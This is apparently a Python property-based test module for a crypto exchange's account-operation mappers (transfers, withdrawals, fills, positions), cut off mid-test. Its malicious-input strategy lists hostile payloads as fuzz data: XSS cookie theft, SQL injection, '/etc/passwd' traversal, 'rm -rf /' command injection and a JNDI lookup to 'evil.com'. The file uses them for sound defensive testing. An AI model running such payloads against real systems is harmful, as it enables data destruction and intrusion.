"""Property-based tests for Backpack Account Data Mapper Account Operations.

This module provides comprehensive property-based testing of Backpack account operation mappers,
which are critical for secure financial data transformation and account management.

SECURITY CRITICAL: Account operation mappers must prevent:
- Financial data corruption through invalid transformations
- Money loss through incorrect transfer/withdrawal mapping
- Data injection attacks through malformed account operation responses
- Precision loss in high-value financial operations
- State corruption through invalid status mapping
- Authentication bypass through client ID manipulation

Key Testing Areas:
- Transfer transformation with comprehensive status mapping validation
- Withdrawal transformation with network and fee validation
- WebSocket fill event transformation with trading data integrity
- Position update transformation with margin calculation safety
- Error handling with proper exception propagation
- Unicode and edge case handling for international operations

Following TESTING_SECURITY_RULES.md:
- NO hardcoded financial values (Hypothesis generates them)
- NO fallback mechanisms that could hide validation errors
- Comprehensive testing of financial transformation boundaries
- Validation of account operation security boundaries

Architecture Compliance:
- Follows RULE-ARCH-MODEL-DESIGN-V2 for mapper design
- Implements RULE-RUNTIME-SAFETY-V4 for safe financial transformations
- Adheres to RULE-NO-SILENCING-V4 for proper error propagation
"""

from __future__ import annotations

from datetime import datetime
from decimal import Decimal, InvalidOperation
from typing import Any, Literal, cast
from unittest.mock import patch

import pytest
from hypothesis import assume, given, settings, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.mappers.account.bp_position_mapper import BackpackPositionMapper
from cyberdelta.apis.backpack.mappers.account.bp_transaction_mapper import BackpackTransactionMapper
from cyberdelta.apis.backpack.mappers.account.bp_transfer_mapper import BackpackTransferMapper
from cyberdelta.apis.backpack.models.bp_raw_fills import BackpackRawFillResponse
from cyberdelta.apis.backpack.models.bp_raw_position import BackpackRawPositionUpdate
from cyberdelta.apis.backpack.models.bp_raw_withdrawal import BackpackRawWithdrawalResponse
from cyberdelta.apis.backpack.response_handlers.bp_account_response_handler import RawJsonResponse
from cyberdelta.apis.common import TransformationError
from cyberdelta.apis.exceptions.data_transformation import DataTransformationError
from cyberdelta.core.enums import InternalTransferStatus, InternalWithdrawalStatus
from cyberdelta.enums import MakerTaker, OrderSide
from cyberdelta.enums.exchange_names import ExchangeName
from cyberdelta.models import DerivativePosition, Fill
from cyberdelta.models.operations import Transfer, Withdrawal


pytestmark = pytest.mark.timing


# =============================================================================
# HYPOTHESIS STRATEGIES FOR ACCOUNT OPERATIONS TESTING
# =============================================================================


def asset_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid asset symbol strings.

    Returns:
        A Hypothesis strategy for valid asset symbols.
    """
    return st.one_of([
        # Common crypto assets
        st.sampled_from([
            "BTC",
            "ETH",
            "SOL",
            "USDC",
            "USDT",
            "AVAX",
            "DOT",
            "LINK",
            "UNI",
            "MATIC",
            "ADA",
            "XRP",
            "DOGE",
            "SHIB",
            "FTM",
            "NEAR",
        ]),
        # Generated asset names
        st.text(
            min_size=2,
            max_size=20,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_."
            ),
        ).filter(lambda x: x.strip() and len(x.encode("utf-8")) <= 20),
        # Unicode asset names (for international testing)
        st.sampled_from(["USDC🚀", "BTC⚡", "ETH💎", "SOL🌞"]),
    ])


def _create_transfer_id(x: int) -> str:
    """Create transfer ID from integer.

    Returns:
        str: Transfer ID in the format 'transfer_{x}'.
    """
    return f"transfer_{x}"


def _create_tx_id(x: str) -> str:
    """Create transaction ID from hex string.

    Returns:
        str: Transaction ID in the format 'tx_{x}'.
    """
    return f"tx_{x}"


def _create_long_client_id() -> str:
    """Create long client ID for testing.

    Returns:
        str: Long client ID with repeated 'a' characters.
    """
    return "client_" + "a" * 100


def transfer_id_strategy() -> SearchStrategy[str]:
    """Generate valid transfer ID strings.

    Returns:
        A Hypothesis strategy for transfer IDs.
    """
    return st.one_of([
        st.builds(_create_transfer_id, st.integers(min_value=1, max_value=999999999)),
        st.builds(_create_tx_id, st.text(min_size=8, max_size=16, alphabet="0123456789abcdef")),
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_"
            ),
        ),
        # Very long IDs for edge case testing
        st.builds(_create_long_client_id),
    ])


def transfer_status_strategy() -> SearchStrategy[str]:
    """Generate transfer status strings.

    Returns:
        A Hypothesis strategy for transfer statuses.
    """
    return st.sampled_from([
        "success",
        "completed",
        "confirmed",
        "pending",
        "processing",
        "failed",
        "rejected",
        "error",
        "unknown_status",
        "cancelled",
    ])


def withdrawal_status_strategy() -> SearchStrategy[str]:
    """Generate withdrawal status strings.

    Returns:
        A Hypothesis strategy for withdrawal statuses.
    """
    return st.sampled_from([
        "confirmed",
        "pending",
        "failure",
        "rejected",
        "cancelled",
        "unknown_status",
    ])


def blockchain_strategy() -> SearchStrategy[str]:
    """Generate blockchain network names.

    Returns:
        A Hypothesis strategy for blockchain names.
    """
    return st.sampled_from([
        "Ethereum",
        "Bitcoin",
        "Solana",
        "Polygon",
        "Avalanche",
        "Binance Smart Chain",
        "Arbitrum",
        "Optimism",
        "Fantom",
        "Cosmos",
    ])


def _create_eth_address(x: str) -> str:
    """Create Ethereum-style address.

    Returns:
        str: Ethereum address in the format '0x{x}'.
    """
    return f"0x{x}"


def _create_btc_address(x: str) -> str:
    """Create Bitcoin-style address.

    Returns:
        str: Bitcoin address in the format 'bc1q{x}'.
    """
    return f"bc1q{x}"


def address_strategy() -> SearchStrategy[str]:
    """Generate cryptocurrency addresses.

    Returns:
        A Hypothesis strategy for crypto addresses.
    """
    return st.one_of([
        # Ethereum-style addresses
        st.builds(
            _create_eth_address, st.text(min_size=40, max_size=40, alphabet="0123456789abcdef")
        ),
        # Bitcoin-style addresses
        st.builds(
            _create_btc_address,
            st.text(min_size=32, max_size=62, alphabet="0123456789abcdefghijklmnopqrstuvwxyz"),
        ),
        # Generic addresses
        st.text(
            min_size=20,
            max_size=80,
            alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"]),
        ),
        # XRP-style addresses
        st.builds(
            lambda x: f"r{x}",
            st.text(
                min_size=24,
                max_size=24,
                alphabet="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",
            ),
        ),
    ])


def decimal_amount_strategy() -> SearchStrategy[Decimal]:
    """Generate valid decimal amounts for financial operations.

    Returns:
        A Hypothesis strategy for decimal amounts.
    """
    return st.one_of([
        # Common amounts
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(1000000), places=8),
        st.decimals(min_value=Decimal("0.000001"), max_value=Decimal(999999), places=18),
        # Edge cases
        st.just(Decimal("0.00000001")),  # Minimum satoshi
        st.just(Decimal(21000000)),  # Max BTC supply
        st.just(Decimal("999999.123456789012345")),  # High precision
    ])


def timestamp_strategy() -> SearchStrategy[str]:
    """Generate timestamp strings.

    Returns:
        A Hypothesis strategy for timestamps.
    """
    return st.one_of([
        # Unix millisecond timestamps
        st.builds(str, st.integers(min_value=1600000000000, max_value=2000000000000)),
        # ISO format timestamps
        st.sampled_from([
            "2024-01-15T10:30:00Z",
            "2024-03-20T14:45:30.123Z",
            "2023-12-31T23:59:59.999Z",
        ]),
        # Invalid timestamps for error testing
        st.sampled_from(["invalid_timestamp", "", "not-a-date"]),
    ])


def order_side_strategy() -> SearchStrategy[Literal["Bid", "Ask"]]:
    """Generate valid order side literals.

    Returns:
        A Hypothesis strategy for order sides.
    """
    return cast(SearchStrategy[Literal["Bid", "Ask"]], st.sampled_from(["Bid", "Ask"]))


@st.composite
def valid_transfer_response_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid transfer response data.

    Returns:
        A dictionary representing valid transfer response data.
    """
    return {
        "id": draw(transfer_id_strategy()),
        "status": draw(transfer_status_strategy()),
        "message": draw(st.one_of([st.none(), st.text(min_size=1, max_size=200)])),
        "timestamp": draw(timestamp_strategy()),
    }


@st.composite
def valid_withdrawal_response_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid withdrawal response data.

    Returns:
        A dictionary representing valid withdrawal response data.
    """
    return {
        "id": draw(st.integers(min_value=1, max_value=999999999999)),
        "status": draw(withdrawal_status_strategy()),
        "blockchain": draw(blockchain_strategy()),
        "quantity": draw(st.builds(str, decimal_amount_strategy())),
        "fee": draw(st.builds(str, decimal_amount_strategy())),
        "symbol": draw(asset_symbol_strategy()),
        "toAddress": draw(address_strategy()),
        "createdAt": draw(timestamp_strategy()),
        "isInternal": draw(st.booleans()),
        "transactionHash": draw(
            st.one_of([
                st.none(),
                st.builds(
                    _create_eth_address,
                    st.text(min_size=64, max_size=64, alphabet="0123456789abcdef"),
                ),
            ])
        ),
        "clientId": draw(st.one_of([st.none(), transfer_id_strategy()])),
    }


@st.composite
def valid_fill_response_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid fill response data.

    Returns:
        A dictionary representing valid fill response data.
    """
    return {
        "tradeId": draw(st.integers(min_value=1, max_value=999999999)),
        "symbol": draw(asset_symbol_strategy().filter(lambda x: "-" in x or "_" in x)),
        "side": draw(order_side_strategy()),
        "quantity": draw(st.builds(str, decimal_amount_strategy())),
        "price": draw(st.builds(str, decimal_amount_strategy())),
        "fee": draw(st.builds(str, decimal_amount_strategy())),
        "feeSymbol": draw(asset_symbol_strategy()),
        "isMaker": draw(st.booleans()),
        "timestamp": draw(timestamp_strategy()),
        "orderId": draw(transfer_id_strategy()),
        "clientId": draw(st.one_of([st.none(), transfer_id_strategy()])),
        "systemOrderType": st.none(),
    }


@st.composite
def valid_position_update_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid position update data.

    Returns:
        A dictionary representing valid position update data.
    """
    net_quantity = draw(
        st.builds(str, st.decimals(min_value=Decimal(-1000), max_value=Decimal(1000), places=8))
    )

    return {
        "e": "positionUpdate",
        "E": draw(st.integers(min_value=1600000000000, max_value=2000000000000)),
        "s": draw(asset_symbol_strategy().filter(lambda x: "-" in x or "_" in x)),
        "b": draw(
            st.one_of([st.none(), st.builds(str, decimal_amount_strategy())])
        ),  # breakEventPrice
        "B": draw(st.one_of([st.none(), st.builds(str, decimal_amount_strategy())])),  # entryPrice
        "l": draw(
            st.one_of([st.none(), st.builds(str, decimal_amount_strategy())])
        ),  # liquidationPrice
        "f": draw(
            st.one_of([
                st.none(),
                st.builds(str, st.decimals(min_value=Decimal(0), max_value=Decimal(1), places=4)),
            ])
        ),  # initialMarginFraction
        "M": draw(st.one_of([st.none(), st.builds(str, decimal_amount_strategy())])),  # markPrice
        "m": draw(
            st.one_of([
                st.none(),
                st.builds(str, st.decimals(min_value=Decimal(0), max_value=Decimal(1), places=4)),
            ])
        ),  # maintenanceMarginFraction
        "q": net_quantity,  # netQuantity
        "Q": draw(
            st.one_of([st.none(), st.builds(str, decimal_amount_strategy())])
        ),  # netExposureQuantity
        "n": draw(
            st.one_of([st.none(), st.builds(str, decimal_amount_strategy())])
        ),  # netExposureNotional
    }


def malicious_account_data_strategy() -> SearchStrategy[object]:
    """Generate malicious data for account operation security testing.

    Returns:
        A Hypothesis strategy for malicious account operation data.
    """
    return st.one_of([
        # XSS attempts
        st.just("<script>alert('account-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE transfers;--"),
        st.just("1' OR '1'='1"),
        # Path traversal
        st.just("../../../etc/passwd"),
        # Command injection
        st.just("; rm -rf /"),
        st.just("$(rm -rf /)"),
        st.just("`rm -rf /`"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("A" * 1500),
        # Unicode attacks
        st.just("\\udce2\\udc28\\udc00"),  # Lone surrogates
        st.just("\\x00\\x01\\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%s"),
        st.just("${jndi:ldap://evil.com/a}"),
        # JSON injection
        st.just('{"malicious": "payload"}'),
        # Account manipulation attempts
        st.just("admin'; UPDATE accounts SET balance=999999999;--"),
        st.just("user_id=1 OR user_id=admin"),
    ])


# =============================================================================
# FIXTURES
# =============================================================================


@pytest.fixture
def transfer_mapper() -> BackpackTransferMapper:
    """Fixture providing a BackpackTransferMapper instance.

    Returns:
        BackpackTransferMapper: Configured mapper instance for testing transfers.
    """
    return BackpackTransferMapper()


@pytest.fixture
def transaction_mapper() -> BackpackTransactionMapper:
    """Fixture providing a BackpackTransactionMapper instance.

    Returns:
        BackpackTransactionMapper: Configured mapper instance for testing transactions.
    """
    return BackpackTransactionMapper()


@pytest.fixture
def position_mapper() -> BackpackPositionMapper:
    """Fixture providing a BackpackPositionMapper instance.

    Returns:
        BackpackPositionMapper: Configured mapper instance for testing positions.
    """
    return BackpackPositionMapper()


# =============================================================================
# PROPERTY TESTS FOR TRANSFER TRANSFORMATION
# =============================================================================


class TestTransferTransformationProperties:
    """Property-based tests for transfer transformation functionality."""

    @given(
        transfer_data=valid_transfer_response_data(),
        asset=asset_symbol_strategy(),
        quantity=decimal_amount_strategy(),
        account_types=st.tuples(
            st.sampled_from(["spot", "margin", "futures"]),
            st.sampled_from(["spot", "margin", "futures"]),
        ),
        client_id=st.one_of([st.none(), transfer_id_strategy()]),
    )
    @settings(max_examples=200, deadline=None)
    def test_transfer_transformation_success_properties(
        self,
        transfer_mapper: BackpackTransferMapper,
        transfer_data: dict[str, Any],
        asset: str,
        quantity: Decimal,
        account_types: tuple[str, str],
        client_id: str | None,
    ) -> None:
        """Property: Valid transfer data should always transform successfully."""
        # Skip invalid data
        assume("id" in transfer_data and transfer_data["id"])
        assume(isinstance(transfer_data["status"], str))

        from_account, to_account = account_types
        raw_response = cast("RawJsonResponse", transfer_data)

        result = transfer_mapper.transform_raw_transfer_to_internal(
            raw_response=raw_response,
            exchange_name=ExchangeName.BACKPACK,
            asset=asset,
            quantity=quantity,
            from_account_type_raw=from_account,
            to_account_type_raw=to_account,
            client_transfer_id=client_id,
        )

        # Property: Result should be valid Transfer object
        assert isinstance(result, Transfer)
        assert result.id == str(transfer_data["id"])
        assert result.exchange == ExchangeName.BACKPACK
        assert result.asset == asset
        assert result.quantity == quantity
        assert isinstance(result.status, InternalTransferStatus)
        assert isinstance(result.timestamp, datetime)

        # Property: Backpack details should be preserved
        assert result.bp_details is not None
        assert result.bp_details.client_id == client_id
        assert result.bp_details.from_account_type == from_account
        assert result.bp_details.to_account_type == to_account

    @given(
        status=transfer_status_strategy(),
        transfer_id=transfer_id_strategy(),
        asset=asset_symbol_strategy(),
        quantity=decimal_amount_strategy(),
    )
    @settings(max_examples=100, deadline=None)
    def test_transfer_status_mapping_properties(
        self,
        transfer_mapper: BackpackTransferMapper,
        status: str,
        transfer_id: str,
        asset: str,
        quantity: Decimal,
    ) -> None:
        """Property: Transfer status mapping should be consistent and safe."""
        transfer_data = {
            "id": transfer_id,
            "status": status,
            "timestamp": "1678886400000",
        }

        result = transfer_mapper.transform_raw_transfer_to_internal(
            raw_response=cast("RawJsonResponse", transfer_data),
            exchange_name=ExchangeName.BACKPACK,
            asset=asset,
            quantity=quantity,
            from_account_type_raw="spot",
            to_account_type_raw="margin",
            client_transfer_id=None,
        )

        # Property: Status mapping should be deterministic
        expected_mappings = {
            "success": InternalTransferStatus.COMPLETED,
            "completed": InternalTransferStatus.COMPLETED,
            "pending": InternalTransferStatus.PENDING,
            "processing": InternalTransferStatus.PENDING,
            "failed": InternalTransferStatus.FAILED,
            "rejected": InternalTransferStatus.FAILED,
        }

        if status in expected_mappings:
            assert result.status == expected_mappings[status]
        else:
            assert result.status == InternalTransferStatus.UNKNOWN

    @given(
        malicious_value=malicious_account_data_strategy(),
        field_name=st.sampled_from(["id", "status", "message"]),
    )
    @settings(max_examples=100, deadline=None)
    def test_transfer_malicious_input_resistance_properties(
        self,
        transfer_mapper: BackpackTransferMapper,
        malicious_value: object,
        field_name: str,
    ) -> None:
        """Property: Transfer transformation should resist malicious inputs."""
        transfer_data: dict[str, object] = {
            "id": "safe_id",
            "status": "success",
            "timestamp": "1678886400000",
        }
        transfer_data[field_name] = malicious_value

        if field_name == "id" and not malicious_value:
            # Missing ID should raise error
            with pytest.raises(DataTransformationError):
                transfer_mapper.transform_raw_transfer_to_internal(
                    raw_response=cast("RawJsonResponse", transfer_data),
                    exchange_name=ExchangeName.BACKPACK,
                    asset="USDC",
                    quantity=Decimal(100),
                    from_account_type_raw="spot",
                    to_account_type_raw="margin",
                    client_transfer_id=None,
                )
        else:
            # Should either succeed with sanitized data or fail safely
            try:
                result = transfer_mapper.transform_raw_transfer_to_internal(
                    raw_response=cast("RawJsonResponse", transfer_data),
                    exchange_name=ExchangeName.BACKPACK,
                    asset="USDC",
                    quantity=Decimal(100),
                    from_account_type_raw="spot",
                    to_account_type_raw="margin",
                    client_transfer_id=None,
                )
                # If successful, data should be safely handled
                assert isinstance(result, Transfer)
                assert result.exchange == ExchangeName.BACKPACK
            except (DataTransformationError, ValidationError, ValueError):
                # Safe failure is acceptable for malicious inputs
                pass

    @given(
        invalid_response_type=st.one_of([st.text(), st.integers(), st.lists(st.text()), st.none()])
    )
    @settings(max_examples=50, deadline=None)
    def test_transfer_invalid_response_type_properties(
        self,
        transfer_mapper: BackpackTransferMapper,
        invalid_response_type: object,
    ) -> None:
        """Property: Invalid response types should be rejected safely."""
        with pytest.raises(DataTransformationError) as exc_info:
            transfer_mapper.transform_raw_transfer_to_internal(
                raw_response=cast("RawJsonResponse", invalid_response_type),
                exchange_name=ExchangeName.BACKPACK,
                asset="USDC",
                quantity=Decimal(100),
                from_account_type_raw="spot",
                to_account_type_raw="margin",
                client_transfer_id=None,
            )

        # Property: Error should contain meaningful information
        assert "Invalid mapping for raw_response" in str(exc_info.value)


# =============================================================================
# PROPERTY TESTS FOR WITHDRAWAL TRANSFORMATION
# =============================================================================


class TestWithdrawalTransformationProperties:
    """Property-based tests for withdrawal transformation functionality."""

    @given(
        withdrawal_data=valid_withdrawal_response_data(),
        asset=asset_symbol_strategy(),
        quantity=decimal_amount_strategy(),
        address=address_strategy(),
        network=st.one_of([st.none(), st.sampled_from(["ethereum", "bitcoin", "solana"])]),
        client_id=st.one_of([st.none(), transfer_id_strategy()]),
        tag=st.one_of([st.none(), st.text(min_size=1, max_size=20)]),
    )
    @settings(max_examples=200, deadline=None)
    def test_withdrawal_transformation_success_properties(
        self,
        transfer_mapper: BackpackTransferMapper,
        withdrawal_data: dict[str, Any],
        asset: str,
        quantity: Decimal,
        address: str,
        network: str | None,
        client_id: str | None,
        tag: str | None,
    ) -> None:
        """Property: Valid withdrawal data should always transform successfully."""
        # Skip invalid statuses that wouldn't pass raw model validation
        assume(withdrawal_data["status"] in ["confirmed", "pending"])

        # Create valid raw withdrawal response
        raw_response = BackpackRawWithdrawalResponse.model_validate(withdrawal_data)

        result = transfer_mapper.transform_raw_withdrawal_response_to_internal(
            raw_response=raw_response,
            asset=asset,
            quantity=quantity,
            address=address,
            network=network,
            client_withdrawal_id=client_id,
            tag=tag,
        )

        # Property: Result should be valid Withdrawal object
        assert isinstance(result, Withdrawal)
        assert result.id == str(withdrawal_data["id"])
        assert result.asset == asset
        assert result.quantity == quantity
        assert result.address == address
        assert isinstance(result.status, InternalWithdrawalStatus)
        assert isinstance(result.timestamp, datetime)

        # Property: Backpack details should be preserved
        assert result.bp_details is not None
        assert result.bp_details.client_id == client_id
        assert result.bp_details.is_internal == withdrawal_data.get("isInternal", False)

    @given(
        status=withdrawal_status_strategy(),
        withdrawal_id=st.integers(min_value=1, max_value=999999999),
    )
    @settings(max_examples=100, deadline=None)
    def test_withdrawal_status_mapping_properties(
        self,
        transfer_mapper: BackpackTransferMapper,
        status: str,
        withdrawal_id: int,
    ) -> None:
        """Property: Withdrawal status mapping should be consistent and safe."""
        # Create valid response first
        withdrawal_data = {
            "id": withdrawal_id,
            "status": "confirmed",  # Start with valid status
            "blockchain": "Ethereum",
            "quantity": "100.0",
            "fee": "1.0",
            "symbol": "USDC",
            "toAddress": "0xtest123",
            "createdAt": "2024-01-15T10:30:00Z",
            "isInternal": False,
        }

        if status in ["confirmed", "pending"]:
            # Valid statuses for raw model
            withdrawal_data["status"] = status
            raw_response = BackpackRawWithdrawalResponse.model_validate(withdrawal_data)
        else:
            # Invalid statuses - create valid model then modify
            raw_response = BackpackRawWithdrawalResponse.model_validate(withdrawal_data)
            raw_response.__dict__["status"] = status

        result = transfer_mapper.transform_raw_withdrawal_response_to_internal(
            raw_response=raw_response,
            asset="USDC",
            quantity=Decimal(100),
            address="0xtest123",
            network="ethereum",
            client_withdrawal_id=None,
            tag=None,
        )

        # Property: Status mapping should be deterministic
        expected_mappings = {
            "confirmed": InternalWithdrawalStatus.COMPLETED,
            "pending": InternalWithdrawalStatus.PENDING,
            "failure": InternalWithdrawalStatus.FAILED,
            "rejected": InternalWithdrawalStatus.FAILED,
            "cancelled": InternalWithdrawalStatus.CANCELED,
        }

        if status in expected_mappings:
            assert result.status == expected_mappings[status]
        else:
            assert result.status == InternalWithdrawalStatus.UNKNOWN

    @given(
        large_amount=st.decimals(
            min_value=Decimal(1000000), max_value=Decimal(999999999), places=18
        ),
        large_fee=st.decimals(min_value=Decimal(1000), max_value=Decimal(999999), places=18),
    )
    @settings(max_examples=50, deadline=None)
    def test_withdrawal_large_amounts_properties(
        self,
        transfer_mapper: BackpackTransferMapper,
        large_amount: Decimal,
        large_fee: Decimal,
    ) -> None:
        """Property: Large withdrawal amounts should be handled correctly."""
        withdrawal_data = {
            "id": 999999999,
            "status": "confirmed",
            "blockchain": "Ethereum",
            "quantity": str(large_amount),
            "fee": str(large_fee),
            "symbol": "BTC",
            "toAddress": "bc1qlargewithdrawal123",
            "createdAt": "2024-01-15T10:30:00Z",
            "isInternal": False,
        }

        raw_response = BackpackRawWithdrawalResponse.model_validate(withdrawal_data)

        result = transfer_mapper.transform_raw_withdrawal_response_to_internal(
            raw_response=raw_response,
            asset="BTC",
            quantity=large_amount,
            address="bc1qlargewithdrawal123",
            network="bitcoin",
            client_withdrawal_id=None,
            tag=None,
        )

        # Property: Large amounts should be preserved exactly
        assert result.quantity == large_amount
        assert result.fee == large_fee


# =============================================================================
# PROPERTY TESTS FOR WEBSOCKET FILL TRANSFORMATION
# =============================================================================


class TestWebSocketFillTransformationProperties:
    """Property-based tests for WebSocket fill transformation functionality."""

    @given(
        fill_data=valid_fill_response_data(),
    )
    @settings(max_examples=200, deadline=None)
    def test_fill_transformation_success_properties(
        self,
        transaction_mapper: BackpackTransactionMapper,
        fill_data: dict[str, Any],
    ) -> None:
        """Property: Valid fill data should transform successfully."""
        # Skip zero amounts that would return None
        assume(Decimal(fill_data["quantity"]) > 0)
        assume(Decimal(fill_data["price"]) > 0)

        raw_fill = BackpackRawFillResponse.model_validate(fill_data)

        result = transaction_mapper.transform_ws_fill_event_to_internal_fill(raw_fill)

        if result is not None:  # Non-zero fills should transform
            # Property: Result should be valid Fill object
            assert isinstance(result, Fill)
            assert result.id == str(fill_data["tradeId"])
            assert result.quantity == Decimal(fill_data["quantity"])
            assert result.price == Decimal(fill_data["price"])
            assert result.fee == Decimal(fill_data["fee"])
            assert result.exchange == ExchangeName.BACKPACK.value

            # Property: Side mapping should be correct
            expected_side = OrderSide.BUY if fill_data["side"] == "Bid" else OrderSide.SELL
            assert result.side == expected_side

            # Property: Maker/taker mapping should be correct
            expected_maker_taker = MakerTaker.MAKER if fill_data["isMaker"] else MakerTaker.TAKER
            assert result.maker_taker == expected_maker_taker

    @given(
        side=order_side_strategy(),
        is_maker=st.booleans(),
    )
    @settings(max_examples=50, deadline=None)
    def test_fill_side_and_maker_taker_mapping_properties(
        self,
        transaction_mapper: BackpackTransactionMapper,
        side: Literal["Bid", "Ask"],
        is_maker: bool,
    ) -> None:
        """Property: Fill side and maker/taker mapping should be consistent."""
        fill_data = {
            "tradeId": 12345,
            "symbol": "SOL-USDC",
            "side": side,
            "quantity": "10.0",
            "price": "100.0",
            "fee": "0.05",
            "feeSymbol": "USDC",
            "isMaker": is_maker,
            "timestamp": "2024-01-15T10:30:00Z",
            "orderId": "order123",
            "clientId": "client123",
            "systemOrderType": None,
        }

        raw_fill = BackpackRawFillResponse.model_validate(fill_data)
        result = transaction_mapper.transform_ws_fill_event_to_internal_fill(raw_fill)

        assert result is not None

        # Property: Side mapping should be deterministic
        expected_side = OrderSide.BUY if side == "Bid" else OrderSide.SELL
        assert result.side == expected_side

        # Property: Maker/taker mapping should be deterministic
        expected_maker_taker = MakerTaker.MAKER if is_maker else MakerTaker.TAKER
        assert result.maker_taker == expected_maker_taker

    @given(
        zero_amount=st.sampled_from(["0", "0.0", "0.00000000"]),
        field_name=st.sampled_from(["quantity", "price"]),
    )
    @settings(max_examples=20, deadline=None)
    def test_fill_zero_amount_handling_properties(
        self,
        transaction_mapper: BackpackTransactionMapper,
        zero_amount: str,
        field_name: str,
    ) -> None:
        """Property: Zero quantities or prices should return None."""
        fill_data = {
            "tradeId": 12345,
            "symbol": "SOL-USDC",
            "side": "Bid",
            "quantity": "10.0",
            "price": "100.0",
            "fee": "0.05",
            "feeSymbol": "USDC",
            "isMaker": True,
            "timestamp": "2024-01-15T10:30:00Z",
            "orderId": "order123",
            "clientId": "client123",
            "systemOrderType": None,
        }
        fill_data[field_name] = zero_amount

        raw_fill = BackpackRawFillResponse.model_validate(fill_data)
        result = transaction_mapper.transform_ws_fill_event_to_internal_fill(raw_fill)

        # Property: Zero amounts should return None
        assert result is None


# =============================================================================
# PROPERTY TESTS FOR WEBSOCKET POSITION UPDATE TRANSFORMATION
# =============================================================================


class TestWebSocketPositionUpdateTransformationProperties:
    """Property-based tests for WebSocket position update transformation functionality."""

    @given(
        position_data=valid_position_update_data(),
    )
    @settings(max_examples=200, deadline=None)
    def test_position_update_transformation_success_properties(
        self,
        position_mapper: BackpackPositionMapper,
        position_data: dict[str, Any],
    ) -> None:
        """Property: Valid position update data should transform successfully."""
        raw_position_update = BackpackRawPositionUpdate.model_validate(position_data)

        result = position_mapper.transform_ws_position_update_to_internal_position(
            raw_position_update
        )

        # Property: Result should be valid DerivativePosition object
        assert isinstance(result, DerivativePosition)
        assert result.exchange == ExchangeName.BACKPACK.value
        assert isinstance(result.timestamp, datetime)

        # Property: Position size and side should be correctly determined
        net_quantity = Decimal(position_data.get("q", "0") or "0")
        assert result.size == net_quantity
        expected_side = OrderSide.BUY if net_quantity >= 0 else OrderSide.SELL
        assert result.side == expected_side

        # Property: Optional fields should be handled correctly
        if position_data.get("B"):  # entryPrice
            assert result.entry_price == Decimal(position_data["B"])
        if position_data.get("M"):  # markPrice
            assert result.mark_price == Decimal(position_data["M"])
        if position_data.get("l"):  # liquidationPrice
            assert result.liquidation_price == Decimal(position_data["l"])

    @given(
        net_quantity=st.decimals(min_value=Decimal(-1000), max_value=Decimal(1000), places=8),
    )
    @settings(max_examples=100, deadline=None)
    def test_position_side_determination_properties(
        self,
        position_mapper: BackpackPositionMapper,
        net_quantity: Decimal,
    ) -> None:
        """Property: Position side should be determined correctly based on quantity."""
        position_data = {
            "e": "positionUpdate",
            "E": 1678886400000,
            "s": "SOL-USDC",
            "b": "100.0",
            "B": "100.0"
            if net_quantity != 0
            else None,  # Entry price needed for non-zero positions
            "l": "90.0",
            "f": "0.05",
            "M": "100.5",
            "m": "0.02",
            "q": str(net_quantity),
            "Q": "10.0",
            "n": "1000.0",
        }

        raw_position_update = BackpackRawPositionUpdate.model_validate(position_data)
        result = position_mapper.transform_ws_position_update_to_internal_position(
            raw_position_update
        )

        # Property: Side should be deterministic based on quantity
        expected_side = OrderSide.BUY if net_quantity >= 0 else OrderSide.SELL
        assert result.side == expected_side
        assert result.size == net_quantity

    @given(
        optional_field=st.sampled_from(["b", "B", "l", "f", "M", "m"]),
    )
    @settings(max_examples=30, deadline=None)
    def test_position_none_optional_fields_properties(
        self,
        position_mapper: BackpackPositionMapper,
        optional_field: str,
    ) -> None:
        """Property: None optional fields should be handled gracefully."""
        position_data: dict[str, str | int | None] = {
            "e": "positionUpdate",
            "E": 1678886400000,
            "s": "SOL-USDC",
            "b": "100.0",
            "B": "100.0",
            "l": "90.0",
            "f": "0.05",
            "M": "100.5",
            "m": "0.02",
            "q": "10.0",
            "Q": "10.0",
            "n": "1000.0",
        }
        position_data[optional_field] = None

        raw_position_update = BackpackRawPositionUpdate.model_validate(position_data)
        result = position_mapper.transform_ws_position_update_to_internal_position(
            raw_position_update
        )

        # Property: Should handle None optional fields gracefully
        assert isinstance(result, DerivativePosition)
        assert result.exchange == ExchangeName.BACKPACK.value


# =============================================================================
# PROPERTY TESTS FOR ERROR HANDLING AND SECURITY
# =============================================================================


class TestAccountOperationSecurityProperties:
    """Property-based tests for security-critical behavior in account operations."""

    @given(
        malicious_asset=malicious_account_data_strategy(),
    )
    @settings(max_examples=100, deadline=None)
    def test_malicious_asset_name_resistance_properties(
        self,
        transfer_mapper: BackpackTransferMapper,
        malicious_asset: object,
    ) -> None:
        """Property: Malicious asset names should be handled safely."""
        transfer_data = {
            "id": "safe_transfer_123",
            "status": "success",
            "timestamp": "1678886400000",
        }

        # Convert malicious input to string if needed
        if not isinstance(malicious_asset, str):
            malicious_asset = str(malicious_asset)

        try:
            result = transfer_mapper.transform_raw_transfer_to_internal(
                raw_response=cast("RawJsonResponse", transfer_data),
                exchange_name=ExchangeName.BACKPACK,
                asset=malicious_asset,
                quantity=Decimal(100),
                from_account_type_raw="spot",
                to_account_type_raw="margin",
                client_transfer_id=None,
            )

            # If successful, malicious input should be preserved as-is (no execution)
            assert result.asset == malicious_asset
            assert isinstance(result, Transfer)
        except (DataTransformationError, ValidationError, ValueError):
            # Safe failure is acceptable for malicious inputs
            pass

    @given(
        large_client_id=st.builds(lambda: "client_" + "x" * 1000),
    )
    @settings(max_examples=50, deadline=None)
    def test_large_client_id_handling_properties(
        self,
        transfer_mapper: BackpackTransferMapper,
        large_client_id: str,
